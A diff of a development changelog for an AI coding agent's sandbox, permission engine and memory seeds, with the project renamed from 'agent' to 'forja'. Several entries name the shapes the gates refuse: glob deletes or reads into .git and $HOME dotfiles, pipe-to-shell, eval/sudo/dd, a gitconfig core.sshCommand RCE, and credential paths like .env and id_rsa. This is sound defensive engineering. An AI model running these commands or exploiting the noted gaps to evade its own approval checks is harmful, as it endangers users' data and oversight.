 **macOS:** Linux-only for now — the tmpfs-overlay semantics (ephemeral + host-isolated) don't map onto sandbox-exec/SBPL (which is path allow/deny, not a mount), so parity needs its own strategy decision. Noted in `maybeWrapSandboxArgv`.
 
@@ -3847,7 +5151,7 @@ Low-severity, noted not fixed: (a) `shouldMask` doesn't count cache dirs as writ
 
 Verification after fixes: sandbox + config 175 + subagent/cli/bg fixtures 247 / 0 fail; `tsc` + Biome clean; live bwrap re-smoke (absent-skips / existing-writable / default-set all green). No commit (awaiting operator review).
 
-**Post-commit follow-up (operator-reported).** The subagent's `[sandbox]` load used the raw `session.cwd`, but the parent bootstrap anchors config at `resolveRepoRoot(cwd)` BEFORE loading. An `isolation:none` child whose `session.cwd` is a repo subdirectory missed a repo-root `.agent/config.toml` (custom or empty `writable_cache_dirs`) and silently fell back to defaults — the exact "subagent ignores config" class the carve-out review tried to close. Fixed: anchor at `resolveRepoRoot(opts.memoryCwd ?? session.cwd)` (same shape the hook re-resolution uses — the parent's invocation cwd when forwarded, else session.cwd, walked to the repo root). Added the first subagent test for the carve-out wiring: a git repo with a root `.agent/config.toml` (`writable_cache_dirs = []`) + a child whose cwd is a subdir → `getWritableCacheDirsOverride()` is `[]` (read from the root), not the stale/undefined a raw-subdir load would give. subagent-child 42 + config 51 / 0 fail; `tsc` + Biome clean.
+**Post-commit follow-up (operator-reported).** The subagent's `[sandbox]` load used the raw `session.cwd`, but the parent bootstrap anchors config at `resolveRepoRoot(cwd)` BEFORE loading. An `isolation:none` child whose `session.cwd` is a repo subdirectory missed a repo-root `.forja/config.toml` (custom or empty `writable_cache_dirs`) and silently fell back to defaults — the exact "subagent ignores config" class the carve-out review tried to close. Fixed: anchor at `resolveRepoRoot(opts.memoryCwd ?? session.cwd)` (same shape the hook re-resolution uses — the parent's invocation cwd when forwarded, else session.cwd, walked to the repo root). Added the first subagent test for the carve-out wiring: a git repo with a root `.forja/config.toml` (`writable_cache_dirs = []`) + a child whose cwd is a subdir → `getWritableCacheDirsOverride()` is `[]` (read from the root), not the stale/undefined a raw-subdir load would give. subagent-child 42 + config 51 / 0 fail; `tsc` + Biome clean.
 
 ## [2026-06-04] INBOX: remove a queued message (lift via ↑, erase to empty)
 
@@ -4357,7 +5661,7 @@ All three verified AUTO→GATE by scratch (and the legit forms — plain `git gr
 
 **Diagnosis.** Operator report: "autonomous mode still prompts for every bash command." Not a wiring bug — the Shift+Tab toggle calls `engine.setApprovalPosture` (`repl.ts:1909`) and `check()` reads the live posture. Root cause is the compound guard meeting the autonomous design. The `autonomous` posture auto-approved **only** `confirmCause: 'policy'`. But `checkBash` forces `confirmCause: 'compound'` on **any** shell metachar (`containsShellInjection`: `;` `&&` `||` `|` `$()` backtick `&` newline — `matcher.ts:325`, applied `engine.ts:693`) **before** the allow rules, and that confirm was terminal. The agent emits compound commands almost universally (chaining `&&`, piping to `head`) — every command in the report's transcript was compound — so autonomous delivered ~zero prompt reduction for bash.
 
-**Change (operator's call, refined mid-work).** A first cut auto-approved a `compound` when the bash AST resolver returned `kind: ok` + no deny segment. The operator then sharpened the goal: *"autonomous should confirm ONLY dangerous commands; read/write inside the repo path must run without confirm"* — so the criterion moved from **structure** (compound / confidence) to **capability** (what the command actually touches). In `autonomous`, a bash `confirmCause` of `compound` / `resolver` / `score` is auto-approved when **every resolved capability is repo-confined** AND no top-level segment matches an operator `deny`. **Repo-confined** = fs read/write/delete UNDER the cwd (and not protected `.git`/`.agent`/`.claude`/system, nor sensitive `.env`/`*.pem`/`id_rsa`/credentials — `.git` off-limits for reads too), LOCAL `git-write` on this repo, the `/dev` safe pseudo-devices (so `2>/dev/null` doesn't gate), and `exec:shell`. **Always confirms:** network (`net-egress`/`net-ingress` — `git push`/`pull`/`fetch` carry net-egress, so they gate despite git-write), unknown binary (`exec:arbitrary`), python/node, secret-access, env/agent-mutate, any path outside cwd or protected/sensitive. Operator opted IN to delete-in-repo and local git-write via `AskUserQuestion`. The score gate is overridden for confined ops (the user accepts repo-bounded risk); structure/confidence no longer gate. Supervised unchanged.
+**Change (operator's call, refined mid-work).** A first cut auto-approved a `compound` when the bash AST resolver returned `kind: ok` + no deny segment. The operator then sharpened the goal: *"autonomous should confirm ONLY dangerous commands; read/write inside the repo path must run without confirm"* — so the criterion moved from **structure** (compound / confidence) to **capability** (what the command actually touches). In `autonomous`, a bash `confirmCause` of `compound` / `resolver` / `score` is auto-approved when **every resolved capability is repo-confined** AND no top-level segment matches an operator `deny`. **Repo-confined** = fs read/write/delete UNDER the cwd (and not protected `.git`/`.forja`/`.claude`/system, nor sensitive `.env`/`*.pem`/`id_rsa`/credentials — `.git` off-limits for reads too), LOCAL `git-write` on this repo, the `/dev` safe pseudo-devices (so `2>/dev/null` doesn't gate), and `exec:shell`. **Always confirms:** network (`net-egress`/`net-ingress` — `git push`/`pull`/`fetch` carry net-egress, so they gate despite git-write), unknown binary (`exec:arbitrary`), python/node, secret-access, env/forja-mutate, any path outside cwd or protected/sensitive. Operator opted IN to delete-in-repo and local git-write via `AskUserQuestion`. The score gate is overridden for confined ops (the user accepts repo-bounded risk); structure/confidence no longer gate. Supervised unchanged.
 
 **Why capability, not structure.** The compound guard + resolver low-confidence are signals of structural *uncertainty*, not danger — gating them made autonomous prompt on nearly every command the agent emits. The real danger line is the *effect*: leaving the repo, hitting the network, running an unknown binary, touching a secret. The resolver already decomposes the whole command into capabilities and pre-policy **Refuses** the genuine injection shapes (substitution, pipe-to-shell, `eval`/`sudo`/`dd`); the leftover `confirm` is classifiable by effect. Empirically validated against the operator's real `explore` transcript: #6 a `**`-glob read (resolver `kind: ok`) now auto-approves, while network / outside-repo / `.env` / `.git` / unknown-binary keep the modal. (#4, a `for`-loop reading the repo, does NOT auto-approve — it is resolver `conservative` with best-effort caps; see the dynamic-dataflow review finding below.)
 
@@ -4453,7 +5757,7 @@ Also verified there is no `shift+tab` keybinding conflict: the modal-manager foc
 
 ## [2026-05-30] fix(permissions) — permission-replay fabricated drift on autonomous auto-approvals
 
-Review catch on the posture feature's forensic blind spot. `agent permission replay --against-current-policy` / `--against-archived-policy` build a disposable engine via `tryReExecute` WITHOUT `approvalPosture`, defaulting to supervised. So re-executing a row the autonomous posture had auto-approved (a low-risk policy `confirm` turned `allow`) returned `confirm` again — and the replay reported `changed_decision` (fabricated policy drift) for every autonomous auto-approved routine confirm, even when the policy never moved. The approvals_log has no posture column, but an autonomous auto-approval stamps an `approval-posture` stage into the row's reason chain; `rowApprovalPosture(row)` recovers it and `tryReExecute` re-runs under that posture, reproducing the `allow`. A caveat (`approval posture (autonomous) reconstructed from the reason chain…`) is appended ONLY when the engine actually re-ran under a reconstructed autonomous posture, keeping the "deterministic" verdict honest about HOW it reproduced (the eligibility re-check still runs without the classifier adjust). Tests: current-policy regression + supervised control + archived-policy regression.
+Review catch on the posture feature's forensic blind spot. `forja permission replay --against-current-policy` / `--against-archived-policy` build a disposable engine via `tryReExecute` WITHOUT `approvalPosture`, defaulting to supervised. So re-executing a row the autonomous posture had auto-approved (a low-risk policy `confirm` turned `allow`) returned `confirm` again — and the replay reported `changed_decision` (fabricated policy drift) for every autonomous auto-approved routine confirm, even when the policy never moved. The approvals_log has no posture column, but an autonomous auto-approval stamps an `approval-posture` stage into the row's reason chain; `rowApprovalPosture(row)` recovers it and `tryReExecute` re-runs under that posture, reproducing the `allow`. A caveat (`approval posture (autonomous) reconstructed from the reason chain…`) is appended ONLY when the engine actually re-ran under a reconstructed autonomous posture, keeping the "deterministic" verdict honest about HOW it reproduced (the eligibility re-check still runs without the classifier adjust). Tests: current-policy regression + supervised control + archived-policy regression.
 
 **Validated:** typecheck + Biome clean; `tests/cli/permission-replay.test.ts` 54 pass / 0 fail. **Branch:** `feat/operation-mode`.
 
@@ -4572,7 +5876,7 @@ The blue-selected change lives in the shared `renderModal`, so the highlighted-s
 
 ## [2026-05-29] permissions — couldGlobReachProtected now scans cwd-escalate dirs too
 
-Closes the gap flagged in the previous entry. `couldGlobReachProtected`'s target set was `systemDeny + absoluteEscalate + tildeEscalate{Files,Dirs}` — it omitted the cwd-escalate dirs (`.git`/`.agent`/`.claude`), even though `protectedTargets` returns them. So a glob expanding into them (`rm .g*`, `cat .git/*`, `for f in .*` from a repo cwd) slipped the protected-glob refuse. Added `...targets.cwdEscalateDirs` to the scan, so such globs are held conservative→refuse like /etc and ~ (a literal read of those dirs still passes — escalate is write-only — but a glob into the zone is refused; this catches e.g. a glob-delete of `.git`).
+Closes the gap flagged in the previous entry. `couldGlobReachProtected`'s target set was `systemDeny + absoluteEscalate + tildeEscalate{Files,Dirs}` — it omitted the cwd-escalate dirs (`.git`/`.forja`/`.claude`), even though `protectedTargets` returns them. So a glob expanding into them (`rm .g*`, `cat .git/*`, `for f in .*` from a repo cwd) slipped the protected-glob refuse. Added `...targets.cwdEscalateDirs` to the scan, so such globs are held conservative→refuse like /etc and ~ (a literal read of those dirs still passes — escalate is write-only — but a glob into the zone is refused; this catches e.g. a glob-delete of `.git`).
 
 **Validated:** +1 regression test (`for f in .*` / `rm .g*` / `cat .git/*` from a repo cwd → Refuse); non-reaching globs (`*.ts`, `*`) still pass (their `rest` starts with `/`); full `tests/permissions/` (2116) + typecheck + biome clean. **Branch:** `chore/sec-fixes`.
 
@@ -4582,7 +5886,7 @@ A bare leading dot before a glob (`.*`) matches DOTFILES in the dir, but `globLi
 
 **Fix.** `resolveGlobPrefix(literalPrefix, ctx)` reconstructs `<dir>/.` when the literal prefix is `.` or ends with `/.`, so the existing filename-completion branch matches (`$HOME/.` + `ssh`). Applied at both glob call sites (the analyzeCommand per-arg loop and the bashResolver loop-word classification). Non-dot globs (`*`, `*.ts`) are untouched — they don't match dotfiles by default, so `for f in *` from $HOME stays Conservative (no over-refusal).
 
-**Validated:** +3 regression tests (`for f in .*` and `grep token .*` from a $HOME cwd → Refuse; non-dot `for f in *` → Conservative); existing glob tests (`/run/media*`, `/etc/pass*`, `~/.s*`) still pass; full `tests/permissions/` (2115) + typecheck + biome clean. **Flagged, not fixed (separate gap):** `couldGlobReachProtected` scans systemDeny/absoluteEscalate/tilde-escalate targets but NOT the cwd-escalate dirs (`.git`/`.agent`/`.claude`), so a glob like `rm .g*` / `for f in .*` from a repo cwd doesn't trip on those — though reads of them pass anyway (escalate is write-only), and a write through such a glob is the residual. **Branch:** `chore/sec-fixes`.
+**Validated:** +3 regression tests (`for f in .*` and `grep token .*` from a $HOME cwd → Refuse; non-dot `for f in *` → Conservative); existing glob tests (`/run/media*`, `/etc/pass*`, `~/.s*`) still pass; full `tests/permissions/` (2115) + typecheck + biome clean. **Flagged, not fixed (separate gap):** `couldGlobReachProtected` scans systemDeny/absoluteEscalate/tilde-escalate targets but NOT the cwd-escalate dirs (`.git`/`.forja`/`.claude`), so a glob like `rm .g*` / `for f in .*` from a repo cwd doesn't trip on those — though reads of them pass anyway (escalate is write-only), and a write through such a glob is the residual. **Branch:** `chore/sec-fixes`.
 
 ## [2026-05-29] permissions — xargs/parallel refuse ANY wrapped command, not just interpreters
 
@@ -4799,7 +6103,7 @@ A repo checked out on a removable drive (`/run/media/<user>/<volume>/...`) had E
 
 ## [2026-05-28] sandbox — hide_paths overlay EROFS aborts every bwrap-wrapped broker spawn on a sparse `$HOME`
 
-`dist/agent-linux-x64` with sandbox enforcement active failed EVERY bash call through the spawn broker: `bash broker call failed: worker produced no response`. The worker never ran — `bwrap` itself aborted before exec'ing the inner binary, surfacing `bwrap: Can't mkdir /home/lex/.aws: Read-only file system` on its (broker-captured, TUI-hidden) stderr. Glob/read kept working because they don't take the bwrap-wrapped worker path.
+`dist/forja-linux-x64` with sandbox enforcement active failed EVERY bash call through the spawn broker: `bash broker call failed: worker produced no response`. The worker never ran — `bwrap` itself aborted before exec'ing the inner binary, surfacing `bwrap: Can't mkdir /home/lex/.aws: Read-only file system` on its (broker-captured, TUI-hidden) stderr. Glob/read kept working because they don't take the bwrap-wrapped worker path.
 
 **Root cause.** `buildBwrapArgv` masks credential paths (§9 hide_paths) by mounting OVER them: `--tmpfs <dir>` for dirs, `--ro-bind /dev/null <file>` for files. Every profile first lays `--ro-bind / /` (whole root read-only). A `--tmpfs` over a target that does NOT exist on the host makes bwrap `mkdir` the mountpoint first — under the now-read-only root — which fails EROFS and aborts the whole spawn. The canonical list is 14 dirs + 8 files and almost no operator has all present, so this broke sandbox-enforced spawn-broker calls on essentially every host. `.ssh` (present) passed; `.aws` (absent) was the first to blow up.
 
@@ -4807,7 +6111,7 @@ A repo checked out on a removable drive (`/run/media/<user>/<volume>/...`) had E
 
 **Fix.** Mount-realizability gate in `buildBwrapArgv` (`src/permissions/sandbox-runner.ts`): emit a hide_paths overlay only when bwrap can realize the mount — the target already exists (mount-over works on the read-only base bind) OR its parent is writable in-profile so bwrap can create the mountpoint. Writable roots mirror the `--bind` mounts: `cwd-rw`/`cwd-rw-net` → cwd, `home-rw` → home, `ro` → none. Injected `pathExists` seam (default `existsSync`), same shape as the existing `realpath` seam; threaded through `maybeWrapSandboxArgv` (Linux only — macOS SBPL deny rules never create mountpoints, so no EROFS there). Same gate applied to the XDG_DATA_HOME / XDG_CONFIG_HOME relocated overlays.
 
-**Security unchanged.** On `ro`/`cwd-rw`/`cwd-rw-net` an absent target under a read-only parent is neither readable (absent — the base `--ro-bind / /` exposes only what's on disk) nor writable (read-only parent), so there is nothing to mask. On `home-rw` (writable home) absent targets are STILL masked, so the create-and-plant write-tampering vector (`~/.gitconfig` `core.sshCommand` RCE, `~/.config/agent/permissions.yaml` policy tamper) stays closed — `home-rw` argv is byte-for-byte unchanged.
+**Security unchanged.** On `ro`/`cwd-rw`/`cwd-rw-net` an absent target under a read-only parent is neither readable (absent — the base `--ro-bind / /` exposes only what's on disk) nor writable (read-only parent), so there is nothing to mask. On `home-rw` (writable home) absent targets are STILL masked, so the create-and-plant write-tampering vector (`~/.gitconfig` `core.sshCommand` RCE, `~/.config/forja/permissions.yaml` policy tamper) stays closed — `home-rw` argv is byte-for-byte unchanged.
 
 **Validated** end-to-end against real bwrap 0.11.2: the exact failing path (bwrap-wrapped worker running `echo hi`) now returns `{"ok":true,"stdout":"hi\n",...}` and the absent `--tmpfs ~/.aws` is gone from the argv. 6 new regression tests (existence gate across profiles + writable-root preservation) added; the full runner suite (154 tests) + typecheck + biome are clean.
 
@@ -4848,9 +6152,9 @@ Bug surfaced post-slice-5b around the user/seeds snapshot's interaction with the
 
 **Deferred (not blockers):** non-listing-iterating peek call sites (e.g., `retrieval/runner.ts`, `retrieval/compression.ts`, the verify-* dispatchers/schedulers, `governance.ts`) work with name+scope from sources that don't carry `subdir` today and target memory types that exclude seeds in practice (`type: project`/`reference` for verify-semantic; pair-keyed conflict candidates from same-scope siblings; governance proposals targeting operator-authored memories). They can adopt `listingScopeOption` if/when their inputs gain subdir.
 
-## [2026-05-28] seed memory — `loadSeedManifest` filters invalid-name keys so `agent init` self-heals
+## [2026-05-28] seed memory — `loadSeedManifest` filters invalid-name keys so `forja init` self-heals
 
-Bug fix on top of slice 5b's installer surface. A hand-edited or corrupt `<user>/seeds/.installed.json` key that fails `validateName` (e.g., `"../old"`, or any name outside the kebab-case domain) crashed `agent init --only=seeds`: the orphan-archive loop called `archiveSeed → seedMemoryFilePath → validateName`, which threw, aborting the install BEFORE the manifest could be rewritten. The loader's contract was "malformed rows are recoverable" but invalid-name keys violated that contract silently.
+Bug fix on top of slice 5b's installer surface. A hand-edited or corrupt `<user>/seeds/.installed.json` key that fails `validateName` (e.g., `"../old"`, or any name outside the kebab-case domain) crashed `forja init --only=seeds`: the orphan-archive loop called `archiveSeed → seedMemoryFilePath → validateName`, which threw, aborting the install BEFORE the manifest could be rewritten. The loader's contract was "malformed rows are recoverable" but invalid-name keys violated that contract silently.
 
 **Branch:** continued on `feat/memory-seeds`.
 
@@ -4872,8 +6176,8 @@ Bug fix on top of slice 5b's installer surface. A hand-edited or corrupt `<user>
 
 Bug fix on top of slice 5b. The `list` subcommand classified every non-disabled canonical seed as `active` based only on the `.disabled.json` sentinel — but a seed can be ABSENT from the loaded set without ever being in the sentinel. Three cases land in `absent`:
 
-1. Operator ran `agent init --no-seeds` (sixth scaffold step skipped → bodies never written).
-2. Operator never ran `agent init` at all (bootstrap by itself does not install — moved out in an earlier commit on this branch).
+1. Operator ran `forja init --no-seeds` (sixth scaffold step skipped → bodies never written).
+2. Operator never ran `forja init` at all (bootstrap by itself does not install — moved out in an earlier commit on this branch).
 3. Operator deleted a body manually post-install (installer routes through `user_kept` with the prior manifest preserved → body stays gone, registry doesn't see it).
 
 In all three the seed is NOT in the registry's user/seeds snapshot and NOT in the model's prompt assembly. Pre-fix the slash reported them as `active`, misleading both the header counts and the per-row state.
@@ -4882,7 +6186,7 @@ In all three the seed is NOT in the registry's user/seeds snapshot and NOT in th
 
 **Shipped on this branch:**
 
-- **`src/cli/slash/commands/memory.ts`** (`handleSeeds` list branch) — three-state classification derived from `(isSeedDisabled, existsSync(seedMemoryFilePath))` in priority order `disabled → absent → active`. Header totals carry the third counter only when non-zero (matches the `, K archived` suffix convention so the post-install steady-state output keeps the two-counter shape operators already memorized). When absent > 0 a recovery hint appends pointing at `agent init` (or `agent init --only=seeds` for catalog refreshes after an existing init).
+- **`src/cli/slash/commands/memory.ts`** (`handleSeeds` list branch) — three-state classification derived from `(isSeedDisabled, existsSync(seedMemoryFilePath))` in priority order `disabled → absent → active`. Header totals carry the third counter only when non-zero (matches the `, K archived` suffix convention so the post-install steady-state output keeps the two-counter shape operators already memorized). When absent > 0 a recovery hint appends pointing at `forja init` (or `forja init --only=seeds` for catalog refreshes after an existing init).
 
 - **`tests/cli/slash/memory.test.ts`** — the existing `seeds list enumerates every canonical seed with active state by default` test was asserting the buggy behavior (no install + `active`). It is replaced by three tests that pin the three baselines:
   - `seeds list reports every canonical seed as 'absent' when nothing is installed` (with the recovery hint asserted);
@@ -4895,7 +6199,7 @@ In all three the seed is NOT in the registry's user/seeds snapshot and NOT in th
 
 ## [2026-05-28] seed memory — `[seed]` marker on every operator-facing list surface (spec §5.7.3 parity fix)
 
-Visibility fix surfaced by the post-slice-5b audit. The eager-load surface (`assembleMemorySection` in `src/cli/memory-prompt.ts:315`) already attached a `[seed]` marker to vendor-curated entries since slice 7, but two operator-facing surfaces did not: the slash `/memory list` and the headless `agent --memory list` CLI (table + JSON). An operator inspecting their memory inventory via either surface had no way to tell vendor meta-behavior apart from their own user-scope writes without inspecting filesystem paths or running shell ad-hoc against `<user>/seeds/`.
+Visibility fix surfaced by the post-slice-5b audit. The eager-load surface (`assembleMemorySection` in `src/cli/memory-prompt.ts:315`) already attached a `[seed]` marker to vendor-curated entries since slice 7, but two operator-facing surfaces did not: the slash `/memory list` and the headless `forja --memory list` CLI (table + JSON). An operator inspecting their memory inventory via either surface had no way to tell vendor meta-behavior apart from their own user-scope writes without inspecting filesystem paths or running shell ad-hoc against `<user>/seeds/`.
 
 **Branch:** continued on `feat/memory-seeds`.
 
@@ -4922,7 +6226,7 @@ Visibility fix surfaced by the post-slice-5b audit. The eager-load surface (`ass
 
 ## [2026-05-28] seed memory — slice 5b: `/memory seeds disable|enable|list` per-seed opt-out
 
-Second half of slice 5 (`docs/spec/MEMORY.md §5.7.6`). Pairs with slice 5a's `--no-seeds` blanket bootstrap opt-out by giving the operator a per-seed opt-out that survives a vendor catalog bump (slice 5a is "I don't want any vendor seeds"; slice 5b is "I want most of them but `<name>` is wrong for my workflow"). Backed by a sentinel at `<user>/seeds/.disabled.json` that the installer's upgrade state machine honors BEFORE the existing fresh/unchanged/vendor_updated/user_kept branches — so disabling a seed is durable across `agent init`, binary upgrades, and catalog version bumps without the operator's intent regressing.
+Second half of slice 5 (`docs/spec/MEMORY.md §5.7.6`). Pairs with slice 5a's `--no-seeds` blanket bootstrap opt-out by giving the operator a per-seed opt-out that survives a vendor catalog bump (slice 5a is "I don't want any vendor seeds"; slice 5b is "I want most of them but `<name>` is wrong for my workflow"). Backed by a sentinel at `<user>/seeds/.disabled.json` that the installer's upgrade state machine honors BEFORE the existing fresh/unchanged/vendor_updated/user_kept branches — so disabling a seed is durable across `forja init`, binary upgrades, and catalog version bumps without the operator's intent regressing.
 
 **Branch:** continued on `feat/memory-seeds`.
 
@@ -4974,9 +6278,9 @@ Both mutation subcommands validate the name against `CANONICAL_SEEDS` (a typo la
 
 **Review fixes (applied before commit).** Max-effort review surfaced two correctness findings + several UX/coverage gaps; the correctness pair was the biggest miss in the initial slice and reshaped the `enable` semantic:
 
-1. **`bodyRestored` was lying + recovery hint was unactionable.** The original `enable` handler computed `bodyRestored = result.userKept.includes(filename) === false` and, when false, told operators to `run agent init --only=seeds`. Two bugs in one branch:
+1. **`bodyRestored` was lying + recovery hint was unactionable.** The original `enable` handler computed `bodyRestored = result.userKept.includes(filename) === false` and, when false, told operators to `run forja init --only=seeds`. Two bugs in one branch:
    - For an operator who had hand-edited the body BEFORE disabling, the installer routes through `user_kept` (hash diverges from prior.hash) but the body IS present on disk and the index regen DOES re-add the entry — the seed is in the loaded set. The handler incorrectly claimed "body missing on disk" and the operator-facing message contradicted reality.
-   - For an operator who deleted the body manually while disabled, the suggested `agent init --only=seeds` produces the same `user_kept` loop (no body + prior manifest → never reinstall), so the recovery hint led nowhere.
+   - For an operator who deleted the body manually while disabled, the suggested `forja init --only=seeds` produces the same `user_kept` loop (no body + prior manifest → never reinstall), so the recovery hint led nowhere.
 
    Fix: `enable` now reshapes the semantic to "I want this seed back to vendor baseline". When the body is absent at enable time, the handler drops the prior manifest entry before re-running the installer — the installer then routes through `fresh` and writes the canonical body. `bodyRestored` is now `existsSync(bodyPath)` after install, which is the actual source of truth for "is the seed in the loaded set?" Both operator-facing branches (success + post-failure check-the-path) now match disk reality.
 
@@ -4995,7 +6299,7 @@ Both mutation subcommands validate the name against `CANONICAL_SEEDS` (a typo la
 
 **Deferred (review findings the slice intentionally does NOT address):**
 - **Shared keyed-JSON-store helper** between `seeds-disabled.ts` and `seeds-manifest.ts` (~50 lines of structurally identical code). Defensible as-is — each helper's warn copy is operator-facing and naming the file purpose ("disabled-seeds sentinel" vs "seed manifest") in the messages keeps diagnostics legible. When a third such store ships, the abstraction earns its weight.
-- **Altitude — move disable/enable primitives to `src/memory/seeds-disabled.ts`** as `disableSeed(roots, name, now)` / `enableSeed(roots, name)`. Defensible because today the slash handler is the single call site; when a headless `agent --memory seeds disable` CLI surface lands, this becomes the natural refactor.
+- **Altitude — move disable/enable primitives to `src/memory/seeds-disabled.ts`** as `disableSeed(roots, name, now)` / `enableSeed(roots, name)`. Defensible because today the slash handler is the single call site; when a headless `forja --memory seeds disable` CLI surface lands, this becomes the natural refactor.
 - **Plumb `ctx.now` to `installVendorSeeds`** so test-fixed clocks affect archive timestamps too. Pure test concern (no production caller observes the divergence today).
 - **Triplicate disk reads** of `.disabled.json` in the slash mutation path. Microsecond-scale sentinel on an interactive command; defensible until the sentinel surface grows.
 
@@ -5003,9 +6307,9 @@ Both mutation subcommands validate the name against `CANONICAL_SEEDS` (a typo la
 
 **Slice 5c followup.** The interactive `[k]eep / [v]iew / [a]ccept / [m]erge` modal for `vendor_updated` conflicts (currently the state machine deterministically writes the new vendor body when the user hasn't edited, and the user_kept branch is reached only when the operator pre-edited the file). Slice 5b's opt-out covers "I don't want this seed at all"; slice 5c covers "I want to inspect the vendor's new body before accepting it" — orthogonal use cases, separate UX paths.
 
-## [2026-05-28] seed memory — slice 5a: `agent init --no-seeds` opt-out flag
+## [2026-05-28] seed memory — slice 5a: `forja init --no-seeds` opt-out flag
 
-First half of slice 5 (`docs/spec/MEMORY.md §5.7.6`). Adds the `--no-seeds` opt-out flag so an operator who wants the full `agent init` scaffold MINUS the bundled vendor seed pack can express that in a single token, without typing the seeds-free `--only=...` csv by hand.
+First half of slice 5 (`docs/spec/MEMORY.md §5.7.6`). Adds the `--no-seeds` opt-out flag so an operator who wants the full `forja init` scaffold MINUS the bundled vendor seed pack can express that in a single token, without typing the seeds-free `--only=...` csv by hand.
 
 **Branch:** continued on `feat/memory-seeds`.
 
@@ -5028,7 +6332,7 @@ The redundant case is accepted (not rejected) because scripted callers may pass 
 
 **Review fixes (applied before commit).** Two findings surfaced by the slice review:
 
-1. **Help-text discoverability.** The new `--no-seeds` flag wasn't listed in `usage()`'s `init` subcommand block, so an operator running `agent init --help` had no way to discover the flag. While auditing, also surfaced a slice-3 drift: the `--only=csv` description still enumerated `(permissions,gitignore,config,playbooks,skills)` without `seeds`. Both fixed: header gains `[--no-seeds]`, description lists seeds in the `--only` enumeration, a `--no-seeds` line is added with a spec pointer. The pre-existing "mentions every recognized flag" test in `args.test.ts` was extended with two toContain calls so a future drift is caught on the help path before shipping.
+1. **Help-text discoverability.** The new `--no-seeds` flag wasn't listed in `usage()`'s `init` subcommand block, so an operator running `forja init --help` had no way to discover the flag. While auditing, also surfaced a slice-3 drift: the `--only=csv` description still enumerated `(permissions,gitignore,config,playbooks,skills)` without `seeds`. Both fixed: header gains `[--no-seeds]`, description lists seeds in the `--only` enumeration, a `--no-seeds` line is added with a spec pointer. The pre-existing "mentions every recognized flag" test in `args.test.ts` was extended with two toContain calls so a future drift is caught on the help path before shipping.
 
 2. **Test coverage symmetry.** The mutex test pinned both flag orderings (`--no-seeds --only=...,seeds` and `--only=...,seeds --no-seeds`) but the redundant-no-op test only pinned the flag-first ordering. A future refactor that moved the resolution branch above the mutex check would not regress the flag-first path but could silently broaden `only` on the only-first path. Extended the no-op test to walk both orderings via a for-loop, matching the mutex test's coverage shape.
 
@@ -5036,9 +6340,9 @@ The redundant case is accepted (not rejected) because scripted callers may pass 
 
 **Followups (5b, 5c).** Slice 5b will add the `/memory seeds disable|enable <name>` sentinel-based opt-out (per-seed, after install) that survives a `vendor_updated` bump. Slice 5c will add the interactive `[k]eep / [v]iew / [a]ccept / [m]erge` modal for `vendor_updated` conflicts (currently the state machine deterministically writes the new vendor body and the user_kept branch is reached only when the operator pre-edited the file).
 
-## [2026-05-28] seed memory — install moves from bootstrap to `agent init`
+## [2026-05-28] seed memory — install moves from bootstrap to `forja init`
 
-End-to-end review surfaced a design-shape question: should vendor seeds install at every bootstrap (current slice-3 behavior) or only when the operator opts into setup via `agent init` (parallel to how skills/playbooks scaffold)? After review, the latter is the right shape — nothing should arrive in the user-global scope without an explicit operator action. This commit moves the install.
+End-to-end review surfaced a design-shape question: should vendor seeds install at every bootstrap (current slice-3 behavior) or only when the operator opts into setup via `forja init` (parallel to how skills/playbooks scaffold)? After review, the latter is the right shape — nothing should arrive in the user-global scope without an explicit operator action. This commit moves the install.
 
 **Branch:** continued on `feat/memory-seeds`.
 
@@ -5056,17 +6360,17 @@ End-to-end review surfaced a design-shape question: should vendor seeds install 
 
   Added `seedSource?: ReadonlyArray<CanonicalSeed>` test seam mirroring `playbookSource`/`skillSource` so tests can pin a fixture without depending on the full canonical set.
 
-- **`src/cli/args.ts`** — added `'seeds'` to `VALID_INIT_STEPS` so `agent init --only=seeds` (and `--only=seeds,skills`) parses cleanly. The drift-guard test in `args.test.ts` walks `DEFAULT_STEPS` and parses each `--only=<step>` — now covers the new step.
+- **`src/cli/args.ts`** — added `'seeds'` to `VALID_INIT_STEPS` so `forja init --only=seeds` (and `--only=seeds,skills`) parses cleanly. The drift-guard test in `args.test.ts` walks `DEFAULT_STEPS` and parses each `--only=<step>` — now covers the new step.
 
 - **`tests/cli/purge.test.ts`** — extended the `STEP_TO_MARKER` drift-guard with an explicit `seeds: null` mapping. Seeds write to user scope (`<user>/seeds/<name>.md`), not the project scope where `purge` operates — so the step is intentionally markerless. The null mapping documents the omission and the two affected drift-guard tests skip the null-mapped step instead of failing.
 
-- **`tests/cli/init.test.ts`** — the "scaffolds all five artifacts on a clean cwd" test now pins `only` to the five project-scope steps. The seed step is exercised by the dedicated test below; mixing it in would either pollute the developer's real `~/.config/agent/` or force XDG isolation on every init test.
+- **`tests/cli/init.test.ts`** — the "scaffolds all five artifacts on a clean cwd" test now pins `only` to the five project-scope steps. The seed step is exercised by the dedicated test below; mixing it in would either pollute the developer's real `~/.config/forja/` or force XDG isolation on every init test.
 
 - **`tests/cli/init-seeds.test.ts`** — 2 new integration tests under an isolated `XDG_CONFIG_HOME`: (a) `runInit({ only: ['seeds'] })` writes the 10 canonical bodies + index + manifest into `<XDG>/agent/memory/seeds/`; (b) a second run reports zero `wrote` + N `skipped` (idempotence).
 
 - **`tests/cli/bootstrap.test.ts`** — reverted the "memory registry is wired even when no memories exist" test to its pre-install assertions: empty list, no `[seed]` marker, no `[user]` lines. The post-slice-7 expectation of seeds-in-prompt is now incorrect because bootstrap doesn't install.
 
-**Behavioral consequence.** An operator who installs Forja and immediately runs `agent` (without `agent init`) sees the `# Memory` header with save-criteria guidance but ZERO entries — including no vendor seeds. This is intentional: the operator's first explicit setup gesture is where seeds arrive, mirroring how `agent init` is also where permissions, gitignore, config, playbooks, and skills land. Operators who skip `init` get a minimal-surface agent; operators who run `init` get the full curated experience.
+**Behavioral consequence.** An operator who installs Forja and immediately runs `forja` (without `forja init`) sees the `# Memory` header with save-criteria guidance but ZERO entries — including no vendor seeds. This is intentional: the operator's first explicit setup gesture is where seeds arrive, mirroring how `forja init` is also where permissions, gitignore, config, playbooks, and skills land. Operators who skip `init` get a minimal-surface agent; operators who run `init` get the full curated experience.
 
 **Tests + validation:** `bun run typecheck` clean, `bun run lint` clean. `bun test tests/memory/ tests/cli/` → 2577 pass.
 
@@ -5103,7 +6407,7 @@ An operator-authored `<user>/safe-edit-discipline.md` eclipses the vendor seed o
 - `bun run typecheck` clean, `bun run lint` clean.
